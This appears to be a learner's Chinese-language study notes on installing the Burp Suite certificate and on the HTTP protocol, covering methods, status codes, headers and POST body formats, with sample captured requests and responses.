# MY NOTE

# Tips

![image-20240717171941442](image/image-20240717171941442-172127204468623.png)杂乱小技巧

### burpsuit证书

<img src="image/image-20240717172528809.png" alt="image-20240717172528809" style="zoom:67%;" />

找到这个

<img src="image/image-20240717172542436.png" alt="image-20240717172542436" style="zoom: 67%;" />

选择第一个以.der结尾

<img src="image/image-20240717172603951.png" alt="image-20240717172603951" style="zoom:67%;" />

安装证书

<img src="image/image-20240717172620596.png" alt="image-20240717172620596" style="zoom: 67%;" />

当前用户

<img src="image/image-20240717172709689.png" alt="image-20240717172709689" style="zoom:67%;" />

选第二个

<img src="image/image-20240717172716648.png" alt="image-20240717172716648" style="zoom:80%;" />

然后重新打开bp浏览器就行

# 7.16

学习文章

```
https://blog.csdn.net/Hardworking666/article/details/123833192
```

## 流量分析

### 报文分析

![image-20240709110706341](image/image-20240709110706341.png)

```
① 是请求方法，GET 和 POST 是最常见的 HTTP 方法，除此以外还包括 DELETE、HEAD、OPTIONS、PUT、TRACE。不过，当前的大多数浏览器只支持 GET 和 POST，Spring 3.0 提供了一个 HiddenHttpMethodFilter ，允许你通过“_method”的表单参数指定这些特殊的 HTTP 方法（实际上还是通过 POST 提交表单）。服务端配置了 HiddenHttpMethodFilter 后，Spring 会根据 _method 参数指定的值模拟出相应的 HTTP 方法，这样，就可以使用这些 HTTP 方法对处理方法进行映射了。
② 为请求对应的 URL 地址，它和报文头的 Host 属性组成完整的请求 URL，
③ 是协议名称及版本号。
④ 是 HTTP 的报文头，报文头包含若干个属性，格式为“属性名:属性值”，服务端据此获取客户端的信息。
⑤ 是报文体，它将一个页面表单中的组件值通过 param1=value1&param2=value2 的键值对形式编码成一个格式化串，它承载多个请求参数的数据。不但报文体可以传递请求参数，请求 URL 也可以通过类似于“/chapter15/user.html? param1=value1&param2=value2”的方式传递请求参数。
```

![image-20240709111155399](image/image-20240709111155399.png)

![image-20240709111747907](image/image-20240709111747907.png)

**常见状态码**

```
200 OK 处理成功！
302跳转
303 See Other 我把你 redirect 到其它的页面，目标的 URL 通过响应报文头的 Location 告诉你。
304 Not Modified 告诉客户端，你请求的这个资源至你上次取得后，并没有更改，你直接用你本地的缓存吧，我很忙哦，你能不能少来烦我啊！
403无权限访问
404 Not Found 你最不希望看到的，即找不到页面。如你在 google 上找到一个页面，点击这个链接返回 404，表示这个页面已经被网站删除了。
500 Internal Server Error 看到这个错误，你就应该查查服务端的日志了，肯定抛出了一堆异常。
```

### 请求方法

根据 HTTP 标准，HTTP 请求可以使用多种请求方法。

HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD 方法。

HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。

```
GET : 请求指定的页面信息，并返回实体主体。
HEAD : 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头
POST : 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。
PUT : 从客户端向服务器传送的数据取代指定的文档的内容。
DELETE : 请求服务器删除指定的页面。
CONNECT : HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。
OPTIONS : 允许客户端查看服务器的性能。
TRACE : 回显服务器收到的请求，主要用于测试或诊断。
PATCH : 是对 PUT 方法的补充，用来对已知资源进行局部更新 。
```

#### HTTP headers

通常 HTTP 消息包括客户机向服务器的请求消息和服务器向客户机的响应消息。这两种类型的消息由一个起始行，一个或者多个头域，一个只是头域结束的空行和可选的消息体组成。HTTP 的头域包括通用头，请求头，响应头和实体头四个部分。每个头域由一个域名，冒号（:）和域值三部分组成。域名是大小写无关的，域值前可以添加任何数量的空格符，头域可以被扩展为多行，在每行开始处，使用至少一个空格或制表符。

#### 通用头域

通用头域包含请求和响应消息都支持的头域，通用头域包含 Cache-Control、 Connection、Date、Pragma、Transfer-Encoding、Upgrade、Via。对通用头域的扩展要求通讯双方都支持此扩展，如果存在不支持的通用头域，一般将会作为实体头域处理。下面简单介绍几个在 UPnP 消息中使用的通用头域。

##### Cache-Control 头域

Cache -Control 指定请求和响应遵循的缓存机制。在请求消息或响应消息中设置 Cache-Control 并不会修改另一个消息处理过程中的缓存处理过程。（cache高度缓存器）

请求时的缓存指令包括 no-cache、no-store、max-age、 max-stale、min-fresh、only-if-cached

响应消息中的指令包括

```
Public 指示响应可被任何缓存区缓存；
Private 指示对于单个用户的整个或部分响应消息，不能被共享缓存处理。这允许服务器仅仅描述当用户的部分响应消息，此响应消息对于其他用户的请求无效；
no-cache 指示请求或响应消息不能缓存；
no-store 用于防止重要的信息被无意的发布。在请求消息中发送将使得请求和响应消息都不使用缓存；
max-age 指示客户机可以接收生存期不大于指定时间（以秒为单位）的响应；
min-fresh 指示客户机可以接收响应时间小于当前时间加上指定时间的响应；
max-stale 指示客户机可以接收超出超时期间的响应消息。如果指定 max-stale 消息的值，那么客户机可以接收超出超时期指定值之内的响应消息。
```

##### Date 头域

date 头域表示消息发送的时间，时间的描述格式由 rfc822 定义。例如，Date:Mon,31Dec200104:25:57GMT。Date 描述的时间表示世界标准时，换算成本地时间，需要知道用户所在的时区。

##### Pragma 头域

Pragma 头域用来包含实现特定的指令，最常用的是 Pragma:no-cache。在 HTTP/1.1 协议中，它的含义和 Cache-Control:no-cache 相同。

##### Connection 头域

**Connection 表示连接状态**

请求
close（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。
keepalive（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。
响应

close（连接已经关闭）。
Keep-Alive：如果浏览器请求保持连接，则该头部表明希望 WEB 服务器保持连接多长时间（秒）。例如：Keep-Alive：300

请求消息(请求头)
请求消息的第一行为下面的格式：Method Request-URI HTTP-Version

Method 表示对于 Request-URI 完成的方法，这个字段是大小写敏感的，包括 OPTIONS、GET、HEAD、POST、PUT、DELETE、TRACE。方法 GET 和 HEAD 应该被所有的通用 WEB 服务器支持，其他所有方法的实现是可选的，GET 方法取回由 Request-URI 标识的信息，
**HEAD 方法**也是取回由 Request-URI 标识的信息，只是可以在响应时，不返回消息体；
**POST 方法**可以请求服务器接收包含在请求中的实体信息，可以用于提交表单，向新闻组、BBS、邮件群组和数据库发送消息。
**Request-URI** 表示请求的URL。Request-URI 遵循 URI 格式，在此字段为星号（*）时，说明请求并不用于某个特定的资源地址，而是用于服务器本身。
**HTTP- Version** 表示支持的 HTTP 版本，例如为 HTTP/1.1。
请求头域允许客户端向服务器传递关于请求或者关于客户机的附加信息。请求头域可能包含下列字段 Accept、Accept-Charset、Accept-Encoding、Accept-Language、Authorization、From、Host、If-Modified-Since、If-Match、If-None-Match、If-Range、If-Unmodified-Since、Max-Forwards、 Proxy-Authorization、Range、Referer、User-Agent。对请求头域的扩展要求通讯双方都支持，如果存在不支持的请求头域,一般将会作为实体头域处理。

典型的请求消息

```
GET http://download.microtool.de:80/somedata.exe get请求 请求后面的网址
Host: download.microtool.de 请求的目标域名或网站
Accept:*/* 表示自己接受什么介质类型 这里/表示任何类型
Pragma: no-cache 无缓存
Cache-Control: no-cache 无缓存 
Referer: http://download.microtool.de/ 来源ip
User-Agent:Mozilla/4.04[en](Win95;I;Nav) 用户代理，也就是浏览器
Range:bytes=554554-制定客户端希望请求的资源范围
```

```
上例第一行表示 HTTP 客户端（可能是浏览器、下载程序）通过 GET 方法获得指定 URL 下的文件。

Host头域指定请求资源的 Intenet 主机和端口号，必须表示请求 url 的原始服务器或网关的位置。HTTP/1.1 请求必须包含主机头域，否则系统会以 400 状态码返回；
Accept：告诉 WEB 服务器自己接受什么介质类型，/ 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。
Accept-Charset： 浏览器申明自己接收的字符集。
Authorization：当客户端接收到来自WEB服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给 WEB 服务器。
```

**Range**

```
表示头500个字节：bytes=0-499
表示第二个500字节：bytes=500-999
表示最后500个字节：bytes=-500
表示500字节以后的范围：bytes=500-
第一个和最后一个字节：bytes=0-0,-1
同时指定几个范围：bytes=500-600,601-999
```

但是服务器可以忽略此请求头，如果无条件 GET 包含 Range 请求头，响应会以状态码 206（PartialContent）返回而不是以 200 （OK）

### 响应消息(响应头)

响应信息如内容类型，类型的长度，服务器信息，设置 Cookie

响应消息的第一行为下面的格式：HTTP-Version Status-Code Reason-Phrase

HTTP -Version 表示支持的 HTTP 版本，例如为 HTTP/1.1。
Status-Code 是一个三个数字的结果代码。
Status-Code 主要用于机器自动识别，Reason-Phrase 主要用于帮助用户理解。Status-Code 的第一个数字定义响应的类别，后两个数字没有分类的作用。第一个数字可能取5个不同的值

```
1xx : 信息响应类，表示接收到请求并且继续处理
2xx : 处理成功响应类，表示动作被成功接收、理解和接受
3xx : 重定向响应类，为了完成指定的动作，必须接受进一步处理
4xx : 客户端错误，客户请求包含语法错误或者是不能正确执行
5xx : 服务端错误，服务器不能正确执行一个正确的请求
```

Reason-Phrase 给 Status-Code 提供一个简单的文本描述。
响应头域允许服务器传递不能放在状态行的附加信息，这些域主要描述服务器的信息和 Request-URI 进一步的信息。响应头域包含 Age、Location、Proxy-Authenticate、Public、Retry-After、Server、Vary、Warning、WWW-Authenticate。对响应头域的扩展要求通讯双方都支持，如果存在不支持的响应头 域，一般将会作为实体头域处理。

典型的响应消息：

```
HTTP/1.0 200 OK 请求结果
Date:Mon,31Dec200104:25:57MGT 响应时间
Server:Apache/1.3.14(Unix) 请求到的服务
Content-type:text/html 返回实体类型
Last-modified:Tue,17Apr200106:46:28GMT  资源最后修改时间
Etag:"a030f020ac7c01:1e9f" 表示网络资源版本
Content-length:39725426 实际传送回来的字节数
Content-range:bytes554554-40279979/40279980 实际传送范围
content-encoding 文档的编码方法
```

Location 响应头用于重定向接收者到一个新 URI 地址。Server 响应头包含处理请求的原始服务器的软件信息。此域能包含多个产品标识和注释，产品标识一般按照重要性排序

实体消息(实体头和实体)
请求消息和响应消息都可以包含实体信息，实体信息一般由实体头域和实体组成。

实体头域包含关于实体的原信息，实体头包括 Allow、Content-Base、Content-Encoding、Content-Language、Content-Length、Content-Location、Content-MD5、Content-Range、Content-Type、Etag、Expires、Last-Modified、extension-header。extension-header 允许客户端定义新的实体头，但是这些域可能无法为接受方识别。

Content-Type 实体头用于向接收方指示实体的介质类型，指定 HEAD 方法送到接收方的实体介质类型，或 GET 方法发送的请求介质类型，表示后面的文档属于什么 MIME 类型。
Content-Length 表示实际传送的字节数。
Allow 实体头至服务器支持哪些请求方法（如 GET、POST 等）。
Content-Range 表示传送的范围，用于指定整个实体中的一部分的插入位置，他也指示了整个实体的长度。在服务器向客户返回一个部分响应，它必须描述响应覆盖的范围和整个实体长度。
一般格式：Content-Range:bytes-unitSPfirst-byte-pos-last-byte-pos/entity-legth

例如，传送头500个字节次字段的形式：Content-Range:bytes0-499/1234 如果一个 http 消息包含此节（例如，对范围请求的响应或对一系列范围的重叠请求）。
Content-Encoding 指文档的编码（Encode）方法。实体可以是一个经过编码的字节流，它的编码方式由 Content-Encoding 或 Content-Type 定义，它的长度由 Content-Length 或 Content-Range 定义。

##### X-Forwarded-For

通过名字就知道，X-Forwarded-For 是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入 RFC 7239（Forwarded HTTP Extension）标准之中。

X-Forwarded-For 请求头格式非常简单，就这样：

X-Forwarded-For: client, proxy1, proxy2
可以看到，XFF 的内容由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP。

如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息：

X-Forwarded-For: IP0, IP1, IP2
Proxy3 直连服务器，它会给 XFF 追加 IP2，表示它是在帮 Proxy2 转发请求。列表中并没有 IP3，IP3 可以在服务端通过 Remote Address 字段获得。我们知道 HTTP 连接基于 TCP 连接，HTTP 协议中没有 IP 的概念，Remote Address 来自 TCP 连接，表示与服务端建立 TCP 连接的设备 IP，在这个例子里就是 IP3。

Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求。不同语言获取 Remote Address 的方式不一样，例如 php 是 $_SERVER[“REMOTE_ADDR”]，Node.js 是 req.connection.remoteAddress，但原理都一样。

实例
HTTP 请求消息头部实例

```
Host：rss.sina.com.cn 请求地址
User-Agent：Mozilla/5、0 (Windows; U; Windows NT 5、1; zh-CN; rv:1、8、1、14) Gecko/20080404 Firefox/2、0、0、14 浏览器
Accept：text/xml,application/xml,application/xhtml+xml,text/html;q=0、9,text/plain;q=0、 8,image/png,*/*;q=0、5   返回类型
Accept-Language：zh-cn,zh;q=0、5  接受语言
Accept-Encoding：gzip,deflate  申明自己的接受编码类型
Accept-Charset：gb2312,utf-8;q=0、7,*;q=0、7 申明字符集
Keep-Alive：300 保持代理
Connection：keep-alive  保持存活代理
Cookie：userId=C5bYpXrimdmsiQmsBPnE1Vn8ZQmdWSm3WRlEB3vRwTnRtW           <- Cookie
If-Modified-Since：Sun, 01 Jun 2008 12:05:30 GMT  最后一次修改时间
Cache-Control：max-age=0  缓存可以接收生存期不大于指定时间（以秒为单位）的响应；
```

HTTP 响应消息头部实例

```
Status：OK - 200                                        <- 响应状态码，表示 web 服务器处理的结果。
Date：Sun, 01 Jun 2008 12:35:47 GMT  时间
Server：Apache/2、0、61 (Unix)  服务器
Last-Modified：Sun, 01 Jun 2008 12:35:30 GMT 最后一次修改时间
Accept-Ranges：bytes  接受范围
Content-Length：18616  实际传送回来的字节数
Cache-Control：max-age=120  
Expires：Sun, 01 Jun 2008 12:37:47 GMT  
Content-Type：application/xml   返回类型
Age：2  表明该实体从产生到现在经过多长时间了
X-Cache：HIT from 236-41、D07071951、sina、com、cn      <- 反向代理服务器使用的 HTTP 头部
Via：1.0 236-41.D07071951.sina.com.cn:80 (squid/2.6.STABLE13)
Connection：close 代理关闭
```

### 头部详解

#### Accept

告诉 WEB 服务器自己接受什么介质类型，/ 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。

##### Accept-Charset

浏览器申明自己接收的字符集

##### Accept-Encoding

浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate）

##### Accept-Language

浏览器申明自己接收的语言,语言跟字符集的区别：中文是语言，中文有多种字符集，比如 big5，gb2312，gbk 等等。

#### Age

当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。

#### Authorization

当客户端接收到来自 WEB 服务器的 WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给 WEB 服务器。

#### Cache-Control

请求：no-cache（不要缓存的实体，要求现在从WEB服务器去取） max-age：（只接受 Age 值小于 max-age 值，并且没有过期的对象） max-stale：（可以接受过去的对象，但是过期时间必须小于 max-stale 值）

#### min-fresh

（接受其新鲜生命期大于其当前 Age 跟 min-fresh 值之和的缓存对象）响应：public(可以用 Cached 内容回应任何用户) private（只能用缓存内容回应先前请求该内容的那个用户） no-cache（可以缓存，但是只有在跟 WEB 服务器验证了其有效后，才能返回给客户端） max-age：（本响应包含的对象的过期时间） ALL: no-store（不允许缓存）

#### Connection

请求：close（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，断开连接，不要等待本次连接的后续请求了）。keepalive（告诉 WEB 服务器或者代理服务器，在完成本次请求的响应后，保持连接，等待本次连接的后续请求）。

#### Content-Disposition

在常规的 HTTP 应答中，Content-Disposition 响应头指示回复的内容该以何种形式展示，是以内联的形式（即网页或者页面的一部分），还是以附件的形式下载并保存到本地。在 multipart/form-data 类型的应答消息体中，Content-Disposition 消息头可以被用在 multipart 消息体的子部分中，用来给出其对应字段的相关信息。各个子部分由在 Content-Type 中定义的分隔符分隔。用在消息体自身则无实际意义。

Content-Disposition 消息头最初是在 MIME 标准中定义的，HTTP 表单及 POST 请求只用到了其所有参数的一个子集。只有 form-data 以及可选的 name 和 filename 三个参数可以应用在 HTTP 场景中。

指令

#### name

后面是一个表单字段名的字符串，每一个字段名会对应一个子部分。在同一个字段名对应多个文件的情况下（例如，带有 multiple 属性的 <input type=file> 元素），则多个子部分共用同一个字段名。如果 name 参数的值为 _charset_ ，意味着这个子部分表示的不是一个 HTML 字段，而是在未明确指定字符集信息的情况下各部分使用的默认字符集。

##### filename

后面是要传送的文件的初始名称的字符串。这个参数总是可选的，而且不能盲目使用：路径信息必须舍掉，同时要进行一定的转换以符合服务器文件系统规则。这个参数主要用来提供展示性信息。当与 Content-Disposition: attachment 一同使用的时候，它被用作"保存为"对话框中呈现给用户的默认文件名。

##### filename*

filename 和 filename* 两个参数的唯一区别在于，filename* 采用了 RFC 5987 中规定的编码方式。当 filename 和 filename* 同时出现的时候，应该优先采用 filename*，假如二者都支持的话。

作为消息主体中的消息头

在 HTTP 场景中，第一个参数或者是 inline（默认值，表示回复中的消息体会以页面的一部分或者整个页面的形式展示），或者是 attachment（意味着消息体应该被下载到本地；大多数浏览器会呈现一个“保存为”的对话框，将 filename 的值预填为下载后的文件名，假如它存在的话）。

```
Content-Disposition: inline
Content-Disposition: attachment
Content-Disposition: attachment; filename="filename.jpg"

```

作为 multipart body 中的消息头

在 HTTP 场景中。第一个参数总是固定不变的 form-data；附加的参数不区分大小写，并且拥有参数值，参数名与参数值用等号 = 连接，参数值用双引号括起来。参数之间用分号 ; 分隔。

```
Content-Disposition: form-data
Content-Disposition: form-data; name="fieldName"
Content-Disposition: form-data; name="fieldName"; filename="filename.jpg"
Content-Encoding
```

WEB 服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。例如：Content-Encoding：gzip

#### Content-Language

WEB 服务器告诉浏览器自己响应的对象的语言。

#### Content-Length

WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length: 26012

#### Content-Range

WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。例如：Content-Range: bytes 21010-47021/47022

#### Content-Type

WEB 服务器告诉浏览器自己响应的对象的类型。例如：Content-Type：application/xml

#### ETag

就是一个对象（比如 URL）的标志值，就一个对象而言，比如一个 html 文件，如果被修改了，其 Etag 也会别修改，所以 ETag 的作用跟 Last-Modified 的作用差不多，主要供 WEB 服务器判断一个对象是否改变了。比如前一次请求某个 html 文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得的 ETag 值发送给WEB 服务器，然后 WEB 服务器会把这个 ETag 跟该文件的当前 ETag 进行对比，然后就知道这个文件有没有改变了。

#### Expired

WEB 服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟 WEB 服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT

#### Host

客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号。例如：Host：rss.sina.com.cn

#### If-Match

如果对象的 ETag 没有改变，其实也就意味著对象没有改变，才执行请求的动作。

#### If-None-Match

如果对象的 ETag 改变了，其实也就意味著对象也改变了，才执行请求的动作。

#### If-Modified-Since

如果请求的对象在该头部指定的时间之后修改了，才执行请求的动作（比如返回对象），否则返回代码304，告诉浏览器该对象没有修改。例如：If-Modified-Since：Thu,10 Apr 2008 09:14:42 GMT

#### If-Unmodified-Since

如果请求的对象在该头部指定的时间之后没修改过，才执行请求的动作（比如返回对象）

#### If-Range

浏览器告诉 WEB 服务器，如果我请求的对象没有改变，就把我缺少的部分给我，如果对象改变了，就把整个对象给我。浏览器通过发送请求对象的 ETag 或者自己所知道的最后修改时间给 WEB 服务器，让其判断对象是否改变了。总是跟 Range 头部一起使用。

#### Last-Modified

WEB 服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT

#### Location

WEB 服务器告诉浏览器，试图访问的对象已经被移到别的位置了，到该头部指定的位置去取。例如：Location http://i0.sinaimg.cn/dy/deco/2008/0528/sina0.gif Location 通常不是直接设置的，而是通过 HttpServletResponse 的 sendRedirect 方法，该方法同时设置状态代码为 302。

#### Pramga

主要使用 Pramga: no-cache，相当于 Cache-Control： no-cache。例如：Pragma：no-cache

#### Proxy-Authenticate

代理服务器响应浏览器，要求其提供代理身份验证信息。

#### Proxy-Authorization

浏览器响应代理服务器的身份验证请求，提供自己的身份信息。

#### Range

浏览器（比如 Flashget 多线程下载时）告诉 WEB 服务器自己想取对象的哪部分。例如：Range:bytes=1173546-

#### Referer

浏览器向 WEB 服务器表明自己是从哪个网页/URL 获得/点击当前请求中的网址/URL。例如：Referer：http://www.sina.com/

#### Server

WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)

#### User-Agent

浏览器表明自己的身份（是哪种浏览器）。 例如：User-Agent：Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 Firefox/2、0、0、14

#### Transfer-Encoding

WEB 服务器表明自己对本响应消息体（不是消息体里面的对象）作了怎样的编码，比如是否分块（chunked）。例如：Transfer-Encoding:chunked

#### Vary

WEB 服务器用该头部的内容告诉 Cache 服务器，在什么条件下才能用本响应所返回的对象响应后续的请求。假如源WEB服务器在接到第一个请求消息时，其响应消息的头部为： Content-Encoding: gzip; Vary: Content-Encoding 那么 Cache 服务器会分析后续请求消息的头部，检查其 Accept-Encoding，是否跟先前响应的 Vary 头部值一致，即是否使用相同的内容编码方法，这样就可以防止 Cache 服务器用自己 Cache 里面压缩后的实体响应给不具备解压能力的浏览器。例如：Vary：Accept-Encoding

#### Via

列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求。当客户端请求到达第一个代理服务器时，该服务器会在自己发出的请求里面添加 Via 头部，并填上自己的相关信息，当下一个代理服务器收到第一个代理服务器的请求时，会在自己发出的请求里面复制前一个代理服务器的请求的 Via 头部，并把自己的相关信息加到后面，以此类推，当 OCS 收到最后一个代理服务器的请求时，检查 Via 头部，就知道该请求所经过的路由。例如：Via：1.0 236.D0707195.sina.com.cn:80 (squid/2.6.STABLE13)

#### Refresh

表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过 setHeader(“Refresh”, “5; URL=http://host/path”) 让浏览器读取指定的页面。注意这种功能通常是通过设置 HTML 页面 HEAD 区的 ＜META HTTP-EQUIV=“Refresh” CONTENT=“5;URL=http://host/path"＞ 实现，这是因为，自动刷新或重定向对于那些不能使用 CGI或 Servlet 的 HTML 编写者十分重要。但是，对于 Servlet 来说，直接设置 Refresh 头更加方便。注意 Refresh 的意义是"N 秒之后刷新本页面或访问指定页面”，而不是"每隔N秒刷新本页面或访问指定页面"。因此，连续刷新要求每次都发送一个 Refresh 头，而发送 204 状态代码则可以阻止浏览器继续刷新，不管是使用 Refresh 头还是 ＜META HTTP-EQUIV=“Refresh” …＞。注意 Refresh 头不属于 HTTP 1.1 正式规范的一部分，而是一个扩展，但 Netscape 和 IE 都支持它。

#### Set-Cookie

设置和页面关联的 Cookie。Servlet 不应使用 response.setHeader(“Set-Cookie”, …) ，而是应使用 HttpServletResponse 提供的专用方法 addCookie。

#### Server

服务器名字。Servlet 一般不设置这个值，而是由 Web 服务器自己设置。

#### WWW-Authenticate

客户应该在 Authorization 头中提供什么类型的授权信息？在包含 401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm=＼“executives＼””) 。注意 Servlet 一般不进行这方面的处理，而是让 Web 服务器的专门机制来控制受密码保护页面的访问（例如 .htaccess）。

#### POST **请求数据提交格式**

服务端通常是根据请求头（headers）中的 Content-Type 字段来获知请求中的消息主体是用何种方式编码，再对主体进行解析。所以说到 POST 提交数据方案，包含了 Content-Type 和消息主体编码方式两部分。

快到中午了，张三丰不想去食堂吃饭，于是打电话叫外卖：老板，我要一份[鱼香肉丝]，要 12：30 之前给我送过来哦，我在江湖湖公司研发部，叫张三丰。
这里，你要[鱼香肉丝]相当于 HTTP 报文体，而“12：30之前送过来”，你叫“张三丰”等信息就相当于 HTTP 的请求头。它们是一些附属信息，帮忙你和饭店老板顺利完成这次交易。

application/x-www-form-urlencoded

最基本的 form 表单结构,用于传递字符参数的键值对,请求结构如下

```
POST  HTTP/1.1
Host: www.demo.com
Cache-Control: no-cache
Postman-Token: 81d7b315-d4be-8ee8-1237-04f3976de032
Content-Type: application/x-www-form-urlencoded
```

key=value&testKey=testValue
请求头中的 Content-Type 设置为 application/x-www-form-urlencoded; 提交的的数据,请求 body 中按照 key1=value1&key2=value2 进行编码,key 和 value 都要进行 urlEncode;

#### multipart/form-data

这是上传文件时,最常见的数据提交方式,看一下请求结构

```
POST  HTTP/1.1
Host: www.demo.com
Cache-Control: no-cache
Postman-Token: 679d816d-8757-14fd-57f2-fbc2518dddd9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="key"

value
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="testKey"

testValue
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="imgFile"; filename="no-file"
Content-Type: application/octet-stream

<data in here>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

首先请求头中的 Content-Type 是 multipart/form-data; 并且会随机生成 一个 boundary, 用于区分请求 body 中的各个数据; 每个数据以 --boundary 开始, 紧接着换行,下面是内容描述信息, 接着换2行, 接着是数据; 然后以 --boundary-- 结尾, 最后换行;

文本数据和文件,图片的内容描述是不相同的 文本参数:

```
Content-Disposition: form-data; name="key"
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
```

文件参数:

```
Content-Disposition: form-data; name="imgFile"; filename="no-file"
Content-Type: application/octet-stream
Content-Transfer-Encoding: binary
```

**请求响应分析**

```
POST /mmtls/00006a5e HTTP/1.1  请求地址 和协议
Accept: */* 接收所有类型
Cache-Control: no-cache 没有缓存
Connection: Keep-Alive 保持连接
Content-Length: 518 返回长度
Content-Type: application/octet-stream 响应类型
Host: 240e:97c:2f:4001::31 
Upgrade: mmtls
User-Agent: MicroMessenger Client 浏览器
X-Online-Host: 240e:97c:2f:4001::31
```

```
POST /ztbox?action=zpblog&appname=pcsearch&v=2.0&data=%7B%22cateid%22%3A%2299%22%2C%22actiondata%22%3A%7B%22id%22%3A18463%2C%22type%22%3A%220%22%2C%22timestamp%22%3A1720509736335%2C%22content%22%3A%7B%22page%22%3A%22home%22%2C%22source%22%3A%22%22%2C%22from%22%3A%22search%22%2C%22type%22%3A%22display%22%2C%22ext%22%3A%7B%7D%7D%7D%7D HTTP/1.1
Host: mbd.baidu.com 请求地址
Cookie: BIDUPSID=26F559E44D0377585F6E20D0849066ED; PSTM=1720509734; BAIDUID=26F559E44D0377582AB02DF95AEC5097:FG=1
Content-Length: 0 响应对象的长度
Sec-Ch-Ua: "Chromium";v="91", " Not;A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 浏览器Chrome/91.0.4472.101 Safari/537.36

Content-Type: text/plain;charset=UTF-8  返回响应类型
Accept: */* 接受类型
Origin: https://www.baidu.com 源地址
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: empty
Referer: https://www.baidu.com/  来源地址
Accept-Encoding: gzip, deflate  接收编码类型
Accept-Language: zh-CN,zh;q=0.9  
Connection: close 连接关闭
```



#### 正常请求

```
GET http://download.microtool.de:80/somedata.exe get请求 请求后面的网址
Host: download.microtool.de 请求的目标域名或网站
Accept:*/* 表示自己接受什么介质类型 这里/表示任何类型
Pragma: no-cache 无缓存
Cache-Control: no-cache 无缓存 
Referer: http://download.microtool.de/ 来源ip
User-Agent:Mozilla/4.04[en](Win95;I;Nav) 用户代理，也就是浏览器
Range:bytes=554554-制定客户端希望请求的资源范围
```

```
Host：rss.sina.com.cn 请求地址
User-Agent：Mozilla/5、0 (Windows; U; Windows NT 5、1; zh-CN; rv:1、8、1、14) Gecko/20080404 Firefox/2、0、0、14 浏览器
Accept：text/xml,application/xml,application/xhtml+xml,text/html;q=0、9,text/plain;q=0、 8,image/png,*/*;q=0、5   返回类型
Accept-Language：zh-cn,zh;q=0、5  接受语言
Accept-Encoding：gzip,deflate  申明自己的接受编码类型
Accept-Charset：gb2312,utf-8;q=0、7,*;q=0、7 申明字符集
Keep-Alive：300 保持连接
Connection：keep-alive  跟服务器或者代理服务器的连接状态
Cookie：userId=C5bYpXrimdmsiQmsBPnE1Vn8ZQmdWSm3WRlEB3vRwTnRtW           <- Cookie
If-Modified-Since：Sun, 01 Jun 2008 12:05:30 GMT  最后一次修改时间
Cache-Control：max-age=0  缓存可以接收生存期不大于指定时间（以秒为单位）的响应；
```

#### 典型响应

```
HTTP/1.0 200 OK 请求结果
Date:Mon,31Dec200104:25:57MGT 响应时间
Server:Apache/1.3.14(Unix) 请求到的服务
Content-type:text/html 返回实体类型
Last-modified:Tue,17Apr200106:46:28GMT  资源最后修改时间
Etag:"a030f020ac7c01:1e9f" 表示网络资源版本
Content-length:39725426 实际传送回来的字节数
Content-range:bytes554554-40279979/40279980 实际传送范围
content-encoding 文档的编码方法
```

```
Status：OK - 200                                        <- 响应状态码，表示 web 服务器处理的结果。
